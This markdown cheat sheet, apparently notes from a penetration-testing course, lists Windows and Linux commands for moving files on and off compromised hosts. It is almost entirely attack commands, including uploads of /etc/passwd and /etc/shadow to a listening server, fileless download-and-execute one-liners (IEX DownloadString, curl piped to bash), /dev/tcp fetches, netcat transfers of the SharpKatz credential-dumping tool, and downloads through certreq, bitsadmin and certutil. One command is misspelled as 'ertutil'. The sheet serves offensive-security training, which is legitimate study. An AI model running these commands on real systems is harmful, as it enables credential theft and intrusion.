# File Transfer

### Windows File Transfer

```shell
  cat id_rsa | base64 -w 0;echo

  //target powershell windows machine
  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64_string>"))

  //Verifying
  md5sum id_rsa
  Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

```shell
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  IEX (New-Object Net.WebClient).DownloadString('<full_url>')
  (New-Object Net.WebClient).DownloadString('<full_url>') | IEX
  Invoke-WebRequest <full_url> -OutFile PowerView.ps1 -UseBasicParsing
  Expand-Archive <filename.zip>
```

```shell
  impacket-smbserver share -smb2support /tmp/smbshare
  impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

  copy \\192.168.220.133\share\nc.exe
  net use n: \\192.168.220.133\share /user:test test
```

```shell
  python3 -m pyftpdlib --port 21

  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

```shell
  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

  echo <base64_encoding> | base64 -d > hosts
```

---

### Linux File Transfer 

```shell
  cat id_rsa |base64 -w 0;echo
  echo -n '<base64_encoding>' | base64 -d > id_rsa
  md5sum id_rsa
```

```shell
  curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

  //fileless
  curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
  wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

```shell
  exec 3<>/dev/tcp/10.10.10.32/80
  echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
  cat <&3
```

```shell
  sudo systemctl start ssh
  netstat -lnpt
  scp plaintext@192.168.49.128:/root/myroot.txt .

  //file upload
  scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

```shell
  sudo python3 -m pip install --user uploadserver
  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
  sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---

### Transferring Files With Code

```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

```

```shell
  python3 -m uploadserver

  //upload the file
  python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

### Miscellaneous File Transfer

```shell
  nc -l -p 8000 > SharpKatz.exe

  nc -q 0 192.168.49.128 8000 < SharpKatz.ex

  //reverse
  nc -l -p 443 -q 0 < SharpKatz.exe
  nc 192.168.49.128 443 > SharpKatz.exe
```

```shell
  Test-NetConnection -ComputerName DATABASE01 -Port 5985
  $Session = New-PSSession -ComputerName DATABASE01
  Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
  Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

```shell
  rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
  xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

### Protected File Transfer

```shell
  Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
  openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

  //decrypt
  openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 
```

---


### Living Off the Land

```shell
  certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
  sudo nc -lvnp 8000
  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
  openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
  openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

  //powershell
  bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
  Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
  ertutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
  
```
